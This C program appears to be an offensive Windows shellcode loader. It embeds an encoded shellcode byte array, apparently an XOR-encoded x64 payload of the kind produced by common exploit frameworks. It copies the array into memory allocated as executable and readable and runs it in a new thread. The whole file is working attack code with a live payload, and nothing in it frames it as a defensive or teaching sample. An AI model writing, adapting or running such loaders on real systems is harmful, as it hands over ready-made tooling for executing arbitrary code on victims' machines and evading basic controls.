#include <stdio.h>
#include <windows.h>



void ShellcodeLoader()
{
	// Insert shellcode here
	unsigned char shellCode[] = "\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\xa6\x12\xb6\xf4\x9c\xd5\xe6\x41\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x5a\x5a\x35"
"\x10\x6c\x3d\x26\x41\xa6\x12\xf7\xa5\xdd\x85\xb4\x10\xf0"
"\x5a\x87\x26\xf9\x9d\x6d\x13\xc6\x5a\x3d\xa6\x84\x9d\x6d"
"\x13\x86\x5a\x3d\x86\xcc\x9d\xe9\xf6\xec\x58\xfb\xc5\x55"
"\x9d\xd7\x81\x0a\x2e\xd7\x88\x9e\xf9\xc6\x00\x67\xdb\xbb"
"\xb5\x9d\x14\x04\xac\xf4\x53\xe7\xbc\x17\x87\xc6\xca\xe4"
"\x2e\xfe\xf5\x4c\x5e\x66\xc9\xa6\x12\xb6\xbc\x19\x15\x92"
"\x26\xee\x13\x66\xa4\x17\x9d\xfe\x05\x2d\x52\x96\xbd\x9d"
"\x05\x05\x17\xee\xed\x7f\xb5\x17\xe1\x6e\x09\xa7\xc4\xfb"
"\xc5\x55\x9d\xd7\x81\x0a\x53\x77\x3d\x91\x94\xe7\x80\x9e"
"\xf2\xc3\x05\xd0\xd6\xaa\x65\xae\x57\x8f\x25\xe9\x0d\xbe"
"\x05\x2d\x52\x92\xbd\x9d\x05\x80\x00\x2d\x1e\xfe\xb0\x17"
"\x95\xfa\x08\xa7\xc2\xf7\x7f\x98\x5d\xae\x40\x76\x53\xee"
"\xb5\xc4\x8b\xbf\x1b\xe7\x4a\xf7\xad\xdd\x8f\xae\xc2\x4a"
"\x32\xf7\xa6\x63\x35\xbe\x00\xff\x48\xfe\x7f\x8e\x3c\xb1"
"\xbe\x59\xed\xeb\xbd\x22\xa2\x95\x73\xf9\x21\x84\xf4\x9c"
"\x94\xb0\x08\x2f\xf4\xfe\x75\x70\x75\xe7\x41\xa6\x5b\x3f"
"\x11\xd5\x69\xe4\x41\x85\xb1\x1a\xe4\x9c\xfb\xa7\x15\xef"
"\x9b\x52\xb8\x15\x24\xa7\xfb\xea\x65\x90\xf3\x63\x00\xaa"
"\xc8\x4c\x7a\xb7\xf5\x9c\xd5\xbf\x00\x1c\x3b\x36\x9f\x9c"
"\x2a\x33\x11\xf6\x5f\x87\x3d\xd1\xe4\x26\x09\x59\xd2\xfe"
"\x7d\x5e\x9d\x19\x81\xee\x9b\x77\xb5\x26\x3f\xe9\x9e\x46"
"\xed\x63\xbc\x15\x12\x8c\x51\xe7\x4a\xfa\x7d\x7e\x9d\x6f"
"\xb8\xe7\xa8\x2f\x51\xe8\xb4\x19\x94\xee\x93\x72\xb4\x9e"
"\xd5\xe6\x08\x1e\x71\xdb\x90\x9c\xd5\xe6\x41\xa6\x53\xe6"
"\xb5\xcc\x9d\x6f\xa3\xf1\x45\xe1\xb9\xad\x15\x8c\x4c\xff"
"\x53\xe6\x16\x60\xb3\x21\x05\x82\x46\xb7\xf5\xd4\x58\xa2"
"\x65\xbe\xd4\xb6\x9c\xd4\x5c\x00\x17\xf6\x53\xe6\xb5\xcc"
"\x94\xb6\x08\x59\xd2\xf7\xa4\xd5\x2a\x2e\x0c\x2f\xd3\xfa"
"\x7d\x5d\x94\x5c\x38\x6a\x2d\x30\x0b\x49\x9d\xd7\x93\xee"
"\xed\x7c\x7f\x92\x94\x5c\x49\x21\x0f\xd6\x0b\x49\x6e\x16"
"\xf4\x04\x44\xf7\x4e\x3a\x40\x5b\xdc\x59\xc7\xfe\x77\x58"
"\xfd\xda\x47\xda\x18\x36\x0f\x7c\xa0\xe3\xfa\xe1\x01\xc4"
"\x9b\xf6\xd5\xbf\x00\x2f\xc8\x49\x21\x9c\xd5\xe6\x41";


	HANDLE hVirtualAlloc;
	SIZE_T  dwSize = sizeof(shellCode);

	// Allocate memory for the shellcode
	if ((hVirtualAlloc = VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL) {
		printf("VirtualAlloc failed: %d\n", GetLastError());
		return;
	}
	else {
		printf("VirtualAlloc succeeded: %p\n", hVirtualAlloc);
	}

	// Copy shellcode into allocated memory
	if (memcpy(hVirtualAlloc, shellCode, dwSize) == NULL) {
		printf("memcpy failed: %d\n", GetLastError());
		return;
	}
	else {
		printf("memcpy succeeded: %p\n", hVirtualAlloc);
	}

	// Create a thread to execute the shellcode
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)hVirtualAlloc, NULL, 0, NULL);
	if (hThread == NULL) {
		printf("CreateThread failed: %d\n", GetLastError());
		return;
	}
	else {
		printf("CreateThread succeeded: %p\n", hThread);
	}

	// Wait for the thread to finish
	WaitForSingleObject(hThread, INFINITE);
	
}




int main()
{
	ShellcodeLoader();
	return 0;
}
